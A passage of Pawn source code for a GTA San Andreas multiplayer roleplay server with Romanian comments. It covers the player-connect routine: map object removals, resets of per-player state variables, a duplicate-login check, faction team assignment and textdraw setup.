		RemoveBuildingForPlayer(playerid, 956, 2139.5156, -1161.4844, 23.3594, 0.25);
		RemoveBuildingForPlayer(playerid, 955, 1154.7266, -1460.8906, 15.1563, 0.25);
		RemoveBuildingForPlayer(playerid, 1775, -19.0391, -57.8359, 1003.6328, 0.25);
		RemoveBuildingForPlayer(playerid, 1776, -36.1484, -57.8750, 1003.6328, 0.25);
		RemoveBuildingForPlayer(playerid, 1775, -16.1172, -91.6406, 1003.6328, 0.25);
		RemoveBuildingForPlayer(playerid, 1776, -17.5469, -91.7109, 1003.6328, 0.25);
		RemoveBuildingForPlayer(playerid, 1776, -16.5313, -140.2969, 1003.6328, 0.25);
		RemoveBuildingForPlayer(playerid, 1775, -15.1016, -140.2266, 1003.6328, 0.25);
		RemoveBuildingForPlayer(playerid, 1776, -33.8750, -186.7656, 1003.6328, 0.25);
		RemoveBuildingForPlayer(playerid, 1775, -32.4453, -186.6953, 1003.6328, 0.25);
		RemoveBuildingForPlayer(playerid, 1775, -35.7266, -140.2266, 1003.6328, 0.25);
		RemoveBuildingForPlayer(playerid, 1775, 495.9688, -24.3203, 1000.7344, 0.25);
		RemoveBuildingForPlayer(playerid, 1776, 500.5625, -1.3672, 1000.7344, 0.25);
		RemoveBuildingForPlayer(playerid, 1775, 501.8281, -1.4297, 1000.7344, 0.25);
		RemoveBuildingForPlayer(playerid, 1775, 373.8281, -178.1406, 1000.7344, 0.25);
		RemoveBuildingForPlayer(playerid, 1977, 316.8750, -140.3516, 998.5859, 0.25);
		RemoveBuildingForPlayer(playerid, 13242, 701.7109, -565.1328, 15.3359, 0.25);//Hq FBI
		RemoveBuildingForPlayer(playerid, 13245, 666.7109, -565.1328, 17.3359, 0.25);
		RemoveBuildingForPlayer(playerid, 782, 643.1484, -614.5625, 15.2813, 0.25);
		RemoveBuildingForPlayer(playerid, 12854, 666.4922, -571.1797, 17.3125, 0.25);
		RemoveBuildingForPlayer(playerid, 1510, 664.2031, -567.6953, 16.2266, 0.25);
		RemoveBuildingForPlayer(playerid, 1512, 664.2109, -567.4141, 16.4141, 0.25);
		RemoveBuildingForPlayer(playerid, 2362, 662.9219, -567.0547, 16.2031, 0.25);
		RemoveBuildingForPlayer(playerid, 1514, 665.2891, -567.2813, 16.4297, 0.25);
		RemoveBuildingForPlayer(playerid, 1686, 655.6641, -571.2109, 15.3594, 0.25);
		RemoveBuildingForPlayer(playerid, 1686, 655.6641, -569.6016, 15.3594, 0.25);
		RemoveBuildingForPlayer(playerid, 1691, 665.7500, -566.3047, 20.0313, 0.25);
		RemoveBuildingForPlayer(playerid, 1688, 705.3438, -576.1406, 21.3281, 0.25);
		RemoveBuildingForPlayer(playerid, 1690, 694.6406, -571.4922, 21.0078, 0.25);
		RemoveBuildingForPlayer(playerid, 12853, 666.7109, -565.1328, 17.3359, 0.25);
		RemoveBuildingForPlayer(playerid, 1686, 655.6641, -558.9297, 15.3594, 0.25);
		RemoveBuildingForPlayer(playerid, 1686, 655.6641, -560.5469, 15.3594, 0.25);
		RemoveBuildingForPlayer(playerid, 12863, 701.7109, -565.1328, 15.3359, 0.25);
		RemoveBuildingForPlayer(playerid, 1687, 670.1016, -558.4063, 20.4297, 0.25);
		RemoveBuildingForPlayer(playerid, 956, 662.4297, -552.1641, 15.7109, 0.25);
		RemoveBuildingForPlayer(playerid, 1438, 670.1094, -550.6563, 15.2734, 0.25);
		RemoveBuildingForPlayer(playerid, 1690, 702.5313, -546.6094, 21.0078, 0.25);
		RemoveBuildingForPlayer(playerid, 1438, 663.3750, -541.6250, 15.2891, 0.25);
		RemoveBuildingForPlayer(playerid, 14843, 266.3516, 81.1953, 1001.2813, 0.25);
		RemoveBuildingForPlayer(playerid, 17350, -54.9922, -1130.7266, 4.5781, 0.25);// trucker
		RemoveBuildingForPlayer(playerid, 1447, -89.9297, -1133.7500, 1.3906, 0.25);
		RemoveBuildingForPlayer(playerid, 1438, -87.0547, -1132.6797, 0.0469, 0.25);
		RemoveBuildingForPlayer(playerid, 17072, -54.9922, -1130.7266, 4.5781, 0.25);
		RemoveBuildingForPlayer(playerid, 17073, -56.1250, -1130.1719, 4.4922, 0.25);
		RemoveBuildingForPlayer(playerid, 1462, -84.3750, -1116.0938, 0.2578, 0.25);
		RemoveBuildingForPlayer(playerid, 1447, -84.0547, -1117.2188, 1.3906, 0.25);
		RemoveBuildingForPlayer(playerid, 1415, -68.3516, -1104.9922, 0.2188, 0.25);
		RemoveBuildingForPlayer(playerid, 1462, -60.3594, -1116.9375, 0.2578, 0.25);
		RemoveBuildingForPlayer(playerid, 1438, -63.6719, -1125.6953, 0.0469, 0.25);
		RemoveBuildingForPlayer(playerid, 1438, -63.4141, -1115.4141, 0.0469, 0.25);
		RemoveBuildingForPlayer(playerid, 1415, -63.8125, -1106.4219, 0.2188, 0.25);
		RemoveBuildingForPlayer(playerid, 1257, 1918.7500, 2314.3984, 11.0938, 0.25);// baracile
		RemoveBuildingForPlayer(playerid, 1257, 1918.8672, 2115.7188, 11.0938, 0.25);
		RemoveBuildingForPlayer(playerid, 1226, 1808.1250, -1859.5391, 16.3516, 0.25);
		RemoveBuildingForPlayer(playerid, 1226, 1783.6719, -1859.5391, 16.3516, 0.25);
		RemoveBuildingForPlayer(playerid, 1302, 0.0, 0.0, 0.0, 6000.0);
		RemoveBuildingForPlayer(playerid, 1209, 0.0, 0.0, 0.0, 6000.0);
		RemoveBuildingForPlayer(playerid, 955, 0.0, 0.0, 0.0, 6000.0);
		RemoveBuildingForPlayer(playerid, 956, 0.0, 0.0, 0.0, 6000.0);
		RemoveBuildingForPlayer(playerid, 1775, 0.0, 0.0, 0.0, 6000.0);
		RemoveBuildingForPlayer(playerid, 1776, 0.0, 0.0, 0.0, 6000.0);
		RemoveBuildingForPlayer(playerid, 1977, 316.8750, -140.3516, 998.5859, 0.25);
		RemoveBuildingForPlayer(playerid, 1226, 2093.9297, -1762.6406, 16.4063, 0.25); // Pizza
		RemoveBuildingForPlayer(playerid, 712, 2100.8125, -1764.3750, 21.3906, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 2105.0859, -1765.6094, 10.8047, 0.25);
		RemoveBuildingForPlayer(playerid, 1226, 2114.7188, -1785.1797, 16.3984, 0.25);
		RemoveBuildingForPlayer(playerid, 1308, 2128.3125, -1786.7109, 12.7031, 0.25);
		RemoveBuildingForPlayer(playerid, 733, 778.2109, -1207.2031, 13.5391, 0.25); // Taietor de gazon
		RemoveBuildingForPlayer(playerid, 729, 731.3906, -1223.1641, 12.5078, 0.25);
		RemoveBuildingForPlayer(playerid, 733, 717.1172, -1236.2266, 12.0625, 0.25);
		RemoveBuildingForPlayer(playerid, 726, 680.8594, -1293.3984, 12.3984, 0.25);
		RemoveBuildingForPlayer(playerid, 732, 782.7969, -1304.0781, 12.3906, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 746.4922, -1303.4141, 11.6719, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 760.4531, -1304.1328, 12.2813, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 782.3438, -1277.8359, 12.2031, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 783.0625, -1245.7969, 12.5938, 0.25);
		RemoveBuildingForPlayer(playerid, 1447, -107.0859, -1196.0859, 3.0391, 0.25); // Garbage
		RemoveBuildingForPlayer(playerid, 1412, -112.1719, -1194.7500, 3.0391, 0.25);
		RemoveBuildingForPlayer(playerid, 1413, -102.1328, -1197.1641, 2.9609, 0.25);
		RemoveBuildingForPlayer(playerid, 1412, -98.9219, -1204.9141, 3.0391, 0.25);
		RemoveBuildingForPlayer(playerid, 985, 2497.4063, 2777.0703, 11.5313, 0.25);
		RemoveBuildingForPlayer(playerid, 986, 2497.4063, 2769.1094, 11.5313, 0.25);
		RemoveBuildingForPlayer(playerid, 1412, -98.8750, -1199.9297, 3.0391, 0.25);
		RemoveBuildingForPlayer(playerid, 727, -73.8203, -1569.1719, 1.3516, 0.25);
		RemoveBuildingForPlayer(playerid, 3175, -64.3828, -1572.2109, 1.4063, 0.25);
		RemoveBuildingForPlayer(playerid, 1226, 1774.7578, -1931.3125, 16.3750, 0.25); //Taxi LS
		RemoveBuildingForPlayer(playerid, 700, 1810.6797, -1944.6406, 11.4453, 0.25);
		RemoveBuildingForPlayer(playerid, 700, 1817.1797, -1944.6406, 11.4453, 0.25);
		RemoveBuildingForPlayer(playerid, 1226, 1806.4297, -1931.6016, 16.3750, 0.25);
		RemoveBuildingForPlayer(playerid, 5024, 1748.8438, -1883.0313, 14.1875, 0.25);
		RemoveBuildingForPlayer(playerid, 1226, 1774.7578, -1901.5391, 16.3750, 0.25);
		RemoveBuildingForPlayer(playerid, 1226, 1806.4297, -1901.8281, 16.3750, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 1836.7188, -1898.8984, 13.7344, 0.25);
		RemoveBuildingForPlayer(playerid, 620, 1747.1875, -1846.7109, 10.8047, 0.25);
		RemoveBuildingForPlayer(playerid, 1297, 937.5547, -1213.8672, 18.5938, 0.25);
		RemoveBuildingForPlayer(playerid, 5818, 954.6875, -1305.7734, 30.1406, 0.25);
		RemoveBuildingForPlayer(playerid, 1267, 953.4922, -1232.5703, 24.1328, 0.25);
		RemoveBuildingForPlayer(playerid, 717, 824.3438, -1155.3750, 23.0000, 0.25);
		RemoveBuildingForPlayer(playerid, 717, 850.9844, -1155.3750, 23.0000, 0.25);
		RemoveBuildingForPlayer(playerid, 717, 875.6094, -1155.3750, 23.0000, 0.25);
		RemoveBuildingForPlayer(playerid, 717, 895.6953, -1155.3750, 23.0000, 0.25);
		RemoveBuildingForPlayer(playerid, 717, 907.7813, -1155.3750, 23.0000, 0.25);
		RemoveBuildingForPlayer(playerid, 717, 927.6172, -1155.3750, 23.0000, 0.25);
		RemoveBuildingForPlayer(playerid, 14843, 266.3516, 81.1953, 1001.2813, 0.25);//gratii pd
		RemoveBuildingForPlayer(playerid, 656, 1096.6250, -294.4141, 72.9375, 0.25);//hitman
		RemoveBuildingForPlayer(playerid, 1340, 2327.8594, 2421.2500, 10.8594, 0.25);//lvpd
		RemoveBuildingForPlayer(playerid, 714, 1481.6484, -638.4844, 90.2422, 0.25);//palat leon
		RemoveBuildingForPlayer(playerid, 659, 1503.7578, -720.7031, 91.6563, 0.25);
		RemoveBuildingForPlayer(playerid, 659, 1492.1250, -716.1250, 93.5000, 0.25);
		RemoveBuildingForPlayer(playerid, 1340, 388.8594, -2071.6641, 7.9453, 0.25); //Garduri Fish
		RemoveBuildingForPlayer(playerid, 1351, 670.8984, -605.9375, 15.1797, 0.25); //Setrese 2 semafoare
		RemoveBuildingForPlayer(playerid, 1351, 647.6641, -540.8359, 15.1797, 0.25); //Setrese 2 semafoare
		
		// CASA LUI RedBull si Andreea
		RemoveBuildingForPlayer(playerid, 10317, -2655.1250, -15.4219, 23.8125, 0.25);
		RemoveBuildingForPlayer(playerid, 10368, -2655.1250, -15.4219, 23.8125, 0.25);
		
		//BISERICA
		RemoveBuildingForPlayer(playerid, 4025, 1777.8359, -1773.9063, 12.5234, 0.25);
		RemoveBuildingForPlayer(playerid, 4070, 1719.7422, -1770.7813, 23.4297, 0.25);
		RemoveBuildingForPlayer(playerid, 1531, 1724.7344, -1741.5000, 14.1016, 0.25);
		RemoveBuildingForPlayer(playerid, 4215, 1777.5547, -1775.0391, 36.7500, 0.25);
		RemoveBuildingForPlayer(playerid, 3986, 1719.7422, -1770.7813, 23.4297, 0.25);
		RemoveBuildingForPlayer(playerid, 4019, 1777.8359, -1773.9063, 12.5234, 0.25);
	
		
	//============================//
	}

 //LOADPLAYEROBJECTS
	
 	// VARIABILELE
	gPlayerUsingLoopingAnim[playerid] = 0;  BusCheckk[playerid] = 0;
	SelectChar[playerid] = 0; 				HidePM[playerid] = 0;
	PhoneOnline[playerid] = 0; 				SelectCharID[playerid] = 0;
	SelectCharPlace[playerid] = 0;			ChosenSkin[playerid] = 0;
	UsingDrugs[playerid] = 0; 				CurrentMoney[playerid] = 0;
	UsedFind[playerid] = 0; 				CP[playerid] = 0;
	Vending[playerid] = 0;                  PlayerInfo[playerid][pFirstAnswer] = 0;
	MoneyMessage[playerid] = 0; 			Hatss[playerid] = 0;
	RepairOffer[playerid] = 999; 			RepairPrice[playerid] = 0;
	RepairCar[playerid] = 0; 				TalkingLive[playerid] = 0;
	LiveOffer[playerid] = 999; 				TakingLesson[playerid] = 0;
	RefillOffer[playerid] = 999; 			RefillPrice[playerid] = 0;
	DrugOffer[playerid] = 999; 				PlayerCuffed[playerid] = 0;
	PlayerCuffedTime[playerid] = 0; 		DrugPrice[playerid] = 0;
	RegistrationStep[playerid] = 0; 		PlayerCuffed2[playerid] = 0;
	DrugGram[playerid] = 0; 				HouseOffer[playerid] = 999;
	HouseID[playerid] = 0;				 	HousePrice[playerid] = 0;
	JailPrice[playerid] = 0; 				MedicTime[playerid] = 0;
	NeedMedicTime[playerid] = 0; 			PlacedNews[playerid] = 0;
	GoChase[playerid] = 999; 				GetChased[playerid] = 999;
	OnDuty[playerid] = 0;                   ofercar[playerid] = -1;
	carprice[playerid] = 0;                 primesccar[playerid] = 0;
	CarID[playerid] = -1;                  	cartype[playerid] = 0;
	OrderReady[playerid] = 0;				Diceid[playerid] = 999;
	GotHit[playerid] = 0; 					MedicCall[playerid] = -1;
	SafeTime[playerid] = 60; 				TransportDuty[playerid] = 0;
	PlayerTied[playerid] = 0; 				TaxiCallTime[playerid] = 0;
	TaxiCall[playerid] = -1; 				MedicCallTime[playerid] = 0;
	MechanicCallTime[playerid] = 0; 		JobDuty[playerid] = 0;
	Mobile[playerid] = -1; 					MechanicCall[playerid] = -1;
	Spectate[playerid] = -1; 				PlayerDrunk[playerid] = 0;
	PlayerDrunkTime[playerid] = 0; 			Unspec[playerid][sLocal] = -1;
 	PlayerInfo[playerid][pNewbieEnabled] = 1;
 	flymode[playerid] = 0;
 	tradecars[playerid] = -1;               tradecars2[playerid] = -1;
	tradetype[playerid] = -1;               tradetype2[playerid] = -1;
	tradeofferer[playerid] = -1;            tradediff[playerid] = 0;
 	ConsumingMoney[playerid] = 0;           hiddenoffer[playerid] = 999;
 	hiddenprice[playerid] = 0;              IsPlayerAFK[playerid] = 0;
	IsCollectingRubbish[playerid] = 0; 		GarbageEndTime[playerid] = 0;
	GarbageTime[playerid] = 0; 				BinTime[playerid] = 0;
    gLastCar[playerid] = 0; 				FirstSpawn[playerid] = 0;
	gOoc[playerid] = 0;                     FactionOffer[playerid] = 999;
	gNews[playerid] = 0; 					BigEar[playerid] = 0;
	gFam[playerid] = 0;						examcar[playerid] = -1;
    hudactivated[playerid] = 0;				PhoneOnlineCalls[playerid] = 0;
	gPlayerLogged[playerid] = 0;            Sunglasses[playerid] = 0;
	gPlayerLogTries[playerid] = 2; 			gPlayerAccount[playerid] = 0;
 	gPlayerSpawned[playerid] = 0;           ReportTime[playerid] = 0;
	FreeOffer[playerid] = -1;               TowAcc[playerid] = 0;
	FreePrice[playerid] = 0; 				PlayerTazeTime[playerid] = 0;
	PlayerStoned[playerid] = 0; 			AcceptOffer[playerid] = -1;
	AcceptPrice[playerid] = 0; 				TicketOffer[playerid] = 999;
	TicketMoney[playerid] = 0; 				TutTime[playerid] = 0;
 	TaxiAccepted[playerid] = 999;           FreePlayer[playerid] = -1;
	TurfsDisp[playerid] = 0; 				PlayerInfo[playerid][pCash] = dollah;
	NoFuel[playerid] = 0; 					LastBiz[playerid] = -1;
	HireCar[playerid] = -1; 				gPlayerAnimLibsPreloaded[playerid] = 0;
	TransportValue[playerid] = 0; 			TransportMoney[playerid] = 0;
	TransportTime[playerid] = 0; 			TransportCost[playerid] = 0;
	TransportDriver[playerid] = 999; 		TransferOffer[playerid] = 999;
	TransferMoney[playerid] = 0; 			AdvPlayer[playerid] = 0;
	AfterTutorial[playerid] = 0;	 		pizzaprize[playerid] = 0;
	InHouse[playerid] = -1; 				InBussines[playerid] = -1;
	targetfind[playerid] = -1; 				PlayerInfo[playerid][pNMessage] = 0;
	adminacceptedhelp[playerid] = -1;       PlayerInfo[playerid][pNMessage2] = 0;
	licenseaccepted[playerid] = -1;         timerrent[playerid] = 0;
	licensesend[playerid] = -1;			 	MatsHolding[playerid] = 0;
	MatsOffer[playerid] = -1; 				MatsPrice[playerid] = 0;
	MatsAmmo[playerid] = 0; 				SellgunOffer[playerid] = -1;
	SellgunPrice[playerid] = 0; 			SellgunMats[playerid] = 0;
	SellgunAmmo[playerid] = 0; 				SellgunID[playerid] = 0;
	pizzaj[playerid] = 0; 					farmerc[playerid] = 0;
	farmertime[playerid] = 1;               pizzatime[playerid] = 0;
	togfind[playerid] = 0;				 	SwitchKey[playerid] = 2;
	bizid[playerid] = 0; 					bizprice[playerid] = 0;
	bizoffer[playerid] = 999; 				BusinessRob[playerid] = 0;
	playerdeath[playerid] = 0; 				curatj[playerid] = 0;
	tazer[playerid] = 0; 					togip[playerid] = 0;
	Speedlimit[playerid] = 0;				WTToggle[playerid] = false;
	WTChannel[playerid] = 0.0; 				Clanidoff[playerid] = 999;
	PlayerHandsup[playerid] = 0;			failpizza[playerid] = -1;
	Trucker[playerid] = 0;					RobTime[playerid] = -1;
	QuestWait[playerid] = 0;                InHQ[playerid] = -1;
	wantedlost[playerid] = 1799;			personalcar[0][playerid] = 0;
	personalcar[1][playerid] = 0;           personalcar[2][playerid] = 0;
	personalcar[3][playerid] = 0;           personalcar[4][playerid] = 0;
	personalcar[5][playerid] = 0;			PizzaCP[playerid] = 0;
	Dicem[playerid] = 999; 					Undercover[playerid] = 0;
	Refueling[playerid] = 0;                workdeja[playerid] = 0;
	voted1[playerid] = -1;                  pizzacar[playerid] = -1;
	voted2[playerid] = 0;                   voted3[playerid] = 0;
	raceoff[playerid] = 999;				reportcheater[playerid] = -1;
	toglc[playerid] = 0;					reportreason[playerid] = 0;
	fight2[playerid] = 999;					playerreported[playerid] = -1;
	taxim[playerid] = 0;					RentTime[playerid] = 0;
	shotTime[playerid] = 0;					TotalTimeRent[playerid] = 0;
    shot[playerid] = 0;						RentVeh[playerid] = -1;
	DeathP[playerid] = 0;                   EnterInModShop[playerid] = 0;
    SomatePermission[playerid] = 1;         TimerFree[playerid] = 0;
    somatee[playerid] = 1;					somated[playerid] = -1;
    CheckBus[playerid] = 0;                 JobStep[playerid] = 0;
    busc[playerid] = 0;                     viddd[playerid] = 0;
 	TruckID[playerid] = 0;					GotoMats[playerid] = 0;
 	Trucker3[playerid] = 0;					Trucker4[playerid] = 0;
 	Trucker2[playerid] = 0;                 AreFaina[playerid] = 0;
 	CarJacker[playerid] = 0;                JackAcc[playerid] = 0;
 	Fishing[playerid] = 0;                  FishTimer[playerid] = 0;
 	TipPeste[playerid] = 0;                 SelFac[playerid] = 0;
 	ticketmuie[playerid] = -1;              pockettime[playerid] = 0;
 	thiefplayer[playerid] = 999;            thiefmoney[playerid] = 0;
 	pocketjaf[playerid] = 0;                thiefmoney[playerid] = 0;
 	thiefplayer[playerid] = 999;            omoarathief[playerid] = 0;
  	DMGadmin[playerid] = 0;                 spawnsetarea[playerid] = 0;
 	ticketgivened[playerid] = 0;            masinispawnate[playerid] = 0;
 	BuyCar[playerid] = -1;                  PlayerInfo[playerid][pNewbieTimeout] = 0;
 	DespawnCar[playerid][0] = -1; 			DespawnCar[playerid][1] = -1;
 	DespawnCar[playerid][2] = -1; 			DespawnCar[playerid][3] = -1;
 	DespawnCar[playerid][4] = -1;			DespawnCar[playerid][5] = -1;
 	DespawnCar[playerid][6] = -1;			DespawnCar[playerid][7] = -1;
 	DespawnCar[playerid][8] = -1;			DespawnCar[playerid][9] = -1;
 	DespawnCar[playerid][10] = -1;			DespawnCar[playerid][11] = -1;
 	DespawnCar[playerid][12] = -1;			DespawnCar[playerid][13] = -1;
 	DespawnCar[playerid][14] = -1;
 	PlayerInfo[playerid][pDrunkLevelLast] = 0;
 	PlayerInfo[playerid][pFPS] = 0;
 	PlayerInfo[playerid][pPaintBallG] = 0;
 	PlayerInfo[playerid][pPaintBallKills] = 0;
 	PlayerInfo[playerid][pNextNotification] = 0;
	format(PlayerInfo[playerid][pNormalName], 30, "NULL");
	format(somatename[playerid], 30, "NULL");
	format(reporttext[playerid], 30, "NULL");
	format(AdvMSG[playerid], 256, "");

	GivePlayerCash(playerid,PlayerInfo[playerid][pCash]);
	PlayerTextDrawShow(playerid, logo[playerid]);

	// ANTI WEAPON CHEAT
	WeaponData[playerid][0] = false; 			WeaponData[playerid][1] = false;
	WeaponData[playerid][2] = false;			WeaponData[playerid][3] = false;
	WeaponData[playerid][4] = false; 			WeaponData[playerid][5] = false;
	WeaponData[playerid][6] = false; 			WeaponData[playerid][7] = false;
	WeaponData[playerid][8] = false; 			WeaponData[playerid][9] = false;
	WeaponData[playerid][10] = false; 			WeaponData[playerid][11] = false;
	WeaponData[playerid][12] = false;

	//Anti connect clan
	new playername[30];
	GetPlayerName(playerid, playername, sizeof(playername));
	foreach(Player, ids)
	{
		new rezultate = 0;
		if(!strcmp(playername, PlayerInfo[ids][pNormalName], true))
		{
			rezultate++;
			if(rezultate > 1)
			{
				SendClientMessage(playerid, COLOR_ERROR, "Someone is already logged with this nick.");
				KickEx(playerid);
			}
			return 1;
		}
	}

	// ANTI MONEY CHEAT
	//TimerAtuPlayer[playerid] = SetTimerEx("UpdatePlayer", 2000, true, "d", playerid);

    // COLOR ON LOGIN
	SetPlayerColor(playerid,COLOR_GRAD2);

	// RESET WANTED
	ClearWanted(playerid);

	// TEAM PLAYER
	if(PlayerInfo[playerid][pMember] == 0)
	{
	    gTeam[playerid] = 3;
    	PlayerInfo[playerid][pTeam] = 3;
	}
	else if(PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pMember] == 15)
	{
	    gTeam[playerid] = 2;
    	PlayerInfo[playerid][pTeam] = 2;
	}
	else if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pMember] == 5 || PlayerInfo[playerid][pMember] == 6 || PlayerInfo[playerid][pMember] == 10)
	{
	    gTeam[playerid] = 5;
    	PlayerInfo[playerid][pTeam] = 5;
	}
	else if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pMember] == 13 || PlayerInfo[playerid][pMember] == 14)
	{
	    gTeam[playerid] = 4;
    	PlayerInfo[playerid][pTeam] = 4;
	}
	else if(PlayerInfo[playerid][pMember] == 11)
	{
	    gTeam[playerid] = 11;
    	PlayerInfo[playerid][pTeam] = 11;
	}
	LoadPTDS(playerid);

	WarTD[0] = CreatePlayerTextDraw(playerid, 461.000000, 252.066665, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, WarTD[0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, WarTD[0], 179.000000, 68.000000);
	PlayerTextDrawAlignment(playerid, WarTD[0], 1);
	PlayerTextDrawColor(playerid, WarTD[0], 84215140);
	PlayerTextDrawSetShadow(playerid, WarTD[0], 0);
	PlayerTextDrawSetOutline(playerid, WarTD[0], 0);
	PlayerTextDrawBackgroundColor(playerid, WarTD[0], 255);
	PlayerTextDrawFont(playerid, WarTD[0], 4);
	PlayerTextDrawSetProportional(playerid, WarTD[0], 0);
	PlayerTextDrawSetShadow(playerid, WarTD[0], 0);

	WarTD[1] = CreatePlayerTextDraw(playerid, 550.899780, 254.133346, "GROVE_STREET_VS_LOS_VAGOS");
	PlayerTextDrawLetterSize(playerid, WarTD[1], 0.172499, 0.909333);
	PlayerTextDrawAlignment(playerid, WarTD[1], 2);
	PlayerTextDrawColor(playerid, WarTD[1], -1);
	PlayerTextDrawSetShadow(playerid, WarTD[1], 0);
	PlayerTextDrawSetOutline(playerid, WarTD[1], 0);
	PlayerTextDrawBackgroundColor(playerid, WarTD[1], 255);
	PlayerTextDrawFont(playerid, WarTD[1], 2);
	PlayerTextDrawSetProportional(playerid, WarTD[1], 1);
	PlayerTextDrawSetShadow(playerid, WarTD[1], 0);

	WarTD[2] = CreatePlayerTextDraw(playerid, 549.399780, 266.733276, "DECESE_PERSONALE:_~R~10");
	PlayerTextDrawLetterSize(playerid, WarTD[2], 0.172499, 0.909333);
	PlayerTextDrawAlignment(playerid, WarTD[2], 3);
	PlayerTextDrawColor(playerid, WarTD[2], -1);
	PlayerTextDrawSetShadow(playerid, WarTD[2], 0);
	PlayerTextDrawSetOutline(playerid, WarTD[2], 0);
	PlayerTextDrawBackgroundColor(playerid, WarTD[2], 255);
	PlayerTextDrawFont(playerid, WarTD[2], 2);
	PlayerTextDrawSetProportional(playerid, WarTD[2], 1);
	PlayerTextDrawSetShadow(playerid, WarTD[2], 0);

	WarTD[3] = CreatePlayerTextDraw(playerid, 549.099853, 276.133850, "UCIDERI_PERSONALE:_~R~10");
	PlayerTextDrawLetterSize(playerid, WarTD[3], 0.172499, 0.909333);
	PlayerTextDrawAlignment(playerid, WarTD[3], 3);
	PlayerTextDrawColor(playerid, WarTD[3], -1);
	PlayerTextDrawSetShadow(playerid, WarTD[3], 0);
	PlayerTextDrawSetOutline(playerid, WarTD[3], 0);
	PlayerTextDrawBackgroundColor(playerid, WarTD[3], 255);
	PlayerTextDrawFont(playerid, WarTD[3], 2);
	PlayerTextDrawSetProportional(playerid, WarTD[3], 1);
	PlayerTextDrawSetShadow(playerid, WarTD[3], 0);

	WarTD[4] = CreatePlayerTextDraw(playerid, 552.599853, 290.667694, "GROVE_STREET_(20_/_10)_>_LOS_VAGOS_(10_/_5)");
	PlayerTextDrawLetterSize(playerid, WarTD[4], 0.172499, 0.909333);
	PlayerTextDrawAlignment(playerid, WarTD[4], 2);
	PlayerTextDrawColor(playerid, WarTD[4], -1);
	PlayerTextDrawSetShadow(playerid, WarTD[4], 0);
	PlayerTextDrawSetOutline(playerid, WarTD[4], 0);
	PlayerTextDrawBackgroundColor(playerid, WarTD[4], 255);
	PlayerTextDrawFont(playerid, WarTD[4], 2);
	PlayerTextDrawSetProportional(playerid, WarTD[4], 1);
	PlayerTextDrawSetShadow(playerid, WarTD[4], 0);

	WarTD[5] = CreatePlayerTextDraw(playerid, 596.599853, 305.601074, "DURATA_RAZBOI:_~R~10:00");
	PlayerTextDrawLetterSize(playerid, WarTD[5], 0.172499, 0.909333);
	PlayerTextDrawAlignment(playerid, WarTD[5], 3);
	PlayerTextDrawColor(playerid, WarTD[5], -1);
	PlayerTextDrawSetShadow(playerid, WarTD[5], 0);
	PlayerTextDrawSetOutline(playerid, WarTD[5], 0);
	PlayerTextDrawBackgroundColor(playerid, WarTD[5], 255);
	PlayerTextDrawFont(playerid, WarTD[5], 2);
	PlayerTextDrawSetProportional(playerid, WarTD[5], 1);
	PlayerTextDrawSetShadow(playerid, WarTD[5], 0);

	WarTD[6] = CreatePlayerTextDraw(playerid, 626.500000, 298.134429, "Brackets are signified so (UCIDERI / DECESE)");
	PlayerTextDrawLetterSize(playerid, WarTD[6], 0.119499, 0.732000);
	PlayerTextDrawAlignment(playerid, WarTD[6], 3);
	PlayerTextDrawColor(playerid, WarTD[6], -1);
	PlayerTextDrawSetShadow(playerid, WarTD[6], 0);
	PlayerTextDrawSetOutline(playerid, WarTD[6], 0);
	PlayerTextDrawBackgroundColor(playerid, WarTD[6], 255);
	PlayerTextDrawFont(playerid, WarTD[6], 2);
	PlayerTextDrawSetProportional(playerid, WarTD[6], 1);
	PlayerTextDrawSetShadow(playerid, WarTD[6], 0);
	
	TradeTD[0] = CreatePlayerTextDraw(playerid, 105.500000, 110.666641, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TradeTD[0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TradeTD[0], 406.000000, 265.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[0], 1);
	PlayerTextDrawColor(playerid, TradeTD[0], 505290495);
	PlayerTextDrawSetShadow(playerid, TradeTD[0], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[0], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[0], 255);
	PlayerTextDrawFont(playerid, TradeTD[0], 4);
	PlayerTextDrawSetProportional(playerid, TradeTD[0], 0);
	PlayerTextDrawSetShadow(playerid, TradeTD[0], 0);

	TradeTD[1] = CreatePlayerTextDraw(playerid, 112.500000, 117.666664, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TradeTD[1], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TradeTD[1], 393.000000, 250.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[1], 1);
	PlayerTextDrawColor(playerid, TradeTD[1], 168430335);
	PlayerTextDrawSetShadow(playerid, TradeTD[1], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[1], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[1], 255);
	PlayerTextDrawFont(playerid, TradeTD[1], 4);
	PlayerTextDrawSetProportional(playerid, TradeTD[1], 0);
	PlayerTextDrawSetShadow(playerid, TradeTD[1], 0);

	TradeTD[2] = CreatePlayerTextDraw(playerid, 80.000000, 113.466705, "");
	PlayerTextDrawLetterSize(playerid, TradeTD[2], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TradeTD[2], 122.000000, 70.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[2], 1);
	PlayerTextDrawColor(playerid, TradeTD[2], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[2], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[2], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[2], 0);
	PlayerTextDrawFont(playerid, TradeTD[2], 5);
	PlayerTextDrawSetProportional(playerid, TradeTD[2], 0);
